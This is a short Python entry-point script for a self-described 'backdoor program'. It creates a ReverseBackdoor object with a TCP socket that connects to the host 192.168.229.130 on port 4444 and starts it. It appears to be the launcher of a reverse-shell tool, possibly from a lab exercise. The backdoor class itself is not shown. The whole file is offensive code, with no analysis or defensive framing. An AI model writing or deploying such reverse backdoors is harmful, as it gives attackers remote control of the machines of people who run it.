"""Module containing the entry-point of backdoor program"""

# Standard Library imports
import socket

# Local App imports
from reverse_backdoor import ReverseBackdoor

if __name__ == '__main__':

    backdoor = ReverseBackdoor("192.168.229.130", 4444, socket.socket(socket.AF_INET,                                                                socket.SOCK_STREAM))
    backdoor.startListening()
